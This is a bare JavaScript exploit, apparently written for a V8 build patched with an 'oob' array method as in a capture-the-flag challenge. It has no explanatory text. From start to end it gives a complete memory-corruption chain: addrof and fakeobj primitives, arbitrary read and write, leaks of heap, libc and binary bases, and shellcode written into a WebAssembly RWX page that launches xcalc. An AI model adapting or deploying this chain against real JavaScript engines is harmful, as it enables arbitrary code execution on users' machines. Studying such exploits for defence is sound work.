var buf=new ArrayBuffer(8);
var f64_buf=new Float64Array(buf);
var u64_buf=new BigUint64Array(buf);

function ftoi(val){
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){
    u64_buf[0]=val;
    return f64_buf[0];
}

var temp_obj={"A":1};
var obj_arr=[temp_obj];
var float_arr=[1.1, 1.2];
var obj_arr_map=obj_arr.oob();
var float_arr_map=float_arr.oob();

function addrof(in_obj){
    obj_arr[0]=in_obj;
    obj_arr.oob(float_arr_map);
    let leak=obj_arr[0];
    obj_arr.oob(obj_arr_map);
    return ftoi(leak);
}

function fakeobj(addr){
    float_arr[0]=itof(addr);
    float_arr.oob(obj_arr_map);
    let fake=float_arr[0];
    float_arr.oob(float_arr_map);
    return fake;
}

var arb_rw_arr=[float_arr_map,1.2,1.3,1.4];

function arb_read(addr){
    if(addr%2n==0){
        addr+=1n;
    }
    let fake=fakeobj(addrof(arb_rw_arr)-0x20n);
    arb_rw_arr[2]=itof(addr-0x10n);
    return ftoi(fake[0]);
}

function initial_arb_write(addr,val){
    if(addr%2n==0){
        addr+=1n;
    }
    let fake=fakeobj(addrof(arb_rw_arr)-0x20n);
    arb_rw_arr[2]=itof(addr-0x10n);
    fake[0]=itof(val);
}

function arb_write(addr,val){
    let array_buf=new ArrayBuffer(8);
    let dataview_buf=new DataView(array_buf,0,8);
    let array_buf_addr=addrof(array_buf);
    let backing_store_addr=array_buf_addr+0x20n;
    initial_arb_write(backing_store_addr,addr);
    dataview_buf.setBigUint64(0,val,true);
}

function copy_shellcode(addr,shellcode){
    let array_buf=new ArrayBuffer(0x100);
    let dataview_buf=new DataView(array_buf);
    let array_buf_addr=addrof(array_buf);
    let backing_store_addr=array_buf_addr+0x20n;
    initial_arb_write(backing_store_addr,addr);
    for(var i=0;i<shellcode.length;i++){
        dataview_buf.setUint32(4*i,shellcode[i],true);
    }
}

obj_arr_offset=0x2f79n
heap_offset=0x10n
heap_leak_offset=0x8f480n
var heap_base=arb_read(ftoi(obj_arr_map)-0x2f69n)-0x8f480n;
console.log("[+] Heap base = 0x"+heap_base.toString(16));
var libc_base=arb_read(heap_base+0x1418n)-0x3ec680n;
console.log("[+] Libc base = 0x"+libc_base.toString(16));
var binary_base=arb_read(heap_base+0x1300n)-0xd807b8n;
console.log("[+] Binary base = 0x"+binary_base.toString(16));
var wasmCode=new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,41,11]);
var wasmModule=new WebAssembly.Module(wasmCode);
var wasmInstance=new WebAssembly.Instance(wasmModule);
var func=wasmInstance.exports.main;
var rwx_base=arb_read(addrof(wasmInstance)+0x88n);
console.log("[+] rwx base = 0x"+rwx_base.toString(16));
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
copy_shellcode(rwx_base,shellcode);
readline();
func();
